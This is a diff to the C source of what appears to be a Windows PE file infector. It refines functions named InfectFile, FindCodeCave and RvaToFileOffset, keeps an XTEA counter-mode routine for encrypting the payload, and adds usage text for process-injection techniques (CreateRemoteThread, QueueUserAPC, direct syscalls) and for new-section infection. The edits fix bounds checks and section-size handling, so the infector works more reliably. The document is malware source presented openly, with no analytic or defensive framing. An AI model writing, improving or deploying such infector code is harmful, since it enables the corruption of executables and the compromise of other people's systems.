@@ -260,7 +260,7 @@ static void XteaCryptCtr(BYTE* data, size_t len) {
         BYTE stream[8];
         XteaEncryptBlock(block, key);
         memcpy(stream, block, sizeof(stream));
-        size_t chunk = (len - offset) < sizeof(stream) ? (len - offset) : sizeof(stream);
+        size_t chunk = min(len - offset, sizeof(stream));
         for (size_t i = 0; i < chunk; i++) {
             data[offset + i] ^= stream[i];
         }
@@ -419,7 +419,10 @@ static BOOL RvaToFileOffset(const IMAGE_SECTION_HEADER* secs, WORD nsec, DWORD r
     if (!secs || !outOffset) return FALSE;
     for (WORD i = 0; i < nsec; i++) {
         DWORD va = secs[i].VirtualAddress;
-        DWORD size = max(secs[i].Misc.VirtualSize, secs[i].SizeOfRawData);
+        DWORD size = secs[i].SizeOfRawData;
+        if (size == 0) {
+            continue;
+        }
         if (rva >= va && rva < va + size) {
             *outOffset = secs[i].PointerToRawData + (rva - va);
             return TRUE;
@@ -448,7 +451,7 @@ static BOOL FindCodeCave(
         }
         DWORD rawStart = secs[i].PointerToRawData;
         DWORD rawSize = secs[i].SizeOfRawData;
-        if (rawStart >= fileSize || rawStart + rawSize > fileSize || rawSize < payloadSize) {
+        if (rawStart >= fileSize || rawSize > fileSize - rawStart || rawSize < payloadSize) {
             continue;
         }
         DWORD run = 0;
@@ -1190,6 +1193,8 @@ static BOOL InfectFile(const char* path, BOOL useSection) {
 
 static void PrintUsage(const char* exeName) {
     printf("Usage: %s [--technique crt|apc|syscall] [--section]\n", exeName);
+    printf("  --technique: crt=CreateRemoteThread, apc=QueueUserAPC, syscall=Nt* memory ops\n");
+    printf("  --section: use new section infection instead of code cave\n");
 }
 
 /**
